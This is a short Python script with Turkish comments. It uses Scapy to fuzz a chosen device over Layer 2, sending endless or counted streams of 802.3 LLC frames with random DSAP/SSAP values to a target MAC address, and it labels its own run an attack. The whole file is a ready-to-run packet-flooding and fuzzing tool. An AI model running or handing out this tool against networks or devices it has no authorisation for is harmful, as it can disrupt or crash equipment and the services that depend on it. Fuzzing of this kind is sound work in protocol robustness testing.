#!/usr/bin/python
# -*- coding: utf-8 -*-

import scapy.all as scapy
from scapy.layers.l2 import Dot3, LLC
import random
import argparse
from colorama import Fore, init

init(autoreset=True)

class LLCFuzzer:
    def __init__(self, target_mac, interface):
        self.target_mac = target_mac
        self.interface = interface

    def generate_mutated_value(self):
        """DSAP veya SSAP için rastgele değer üretir."""
        return random.randint(0x00, 0xff)

    def run(self, iterations=None):
        """Saldırıyı başlatır."""
        print(Fore.BLUE + "-"*50)
        print(Fore.CYAN + f"[!] Hedef MAC: {self.target_mac}")
        print(Fore.CYAN + f"[!] Arayüz: {self.interface}")
        print(Fore.CYAN + "[!] Saldırı tipi: LLC DSAP/SSAP Fuzzing")
        print(Fore.BLUE + "-"*50)

        count = 0
        try:
            while True:
                dsap_val = self.generate_mutated_value()
                ssap_val = self.generate_mutated_value()


                packet = scapy.Dot3(dst=self.target_mac) / scapy.LLC(dsap=dsap_val, ssap=ssap_val, ctrl=3)

                # Paketi gönder
                scapy.sendp(packet, iface=self.interface, verbose=False)

                count += 1
                if count % 100 == 0:
                    print(Fore.YELLOW + f"[+] {count} paket gönderildi... Son: DSAP {hex(dsap_val)}, SSAP {hex(ssap_val)}")

                if iterations and count >= iterations:
                    break

        except KeyboardInterrupt:
            print(Fore.RED + f"\n[!] Durduruldu. Toplam {count} paket.")
        except Exception as e:
            print(Fore.RED + f"\n[!] Hata: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LLC DSAP/SSAP Fuzzer")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("-n", "--number", type=int)

    args = parser.parse_args()
    fuzzer = LLCFuzzer(target_mac=args.target, interface=args.interface)
    fuzzer.run(iterations=args.number)
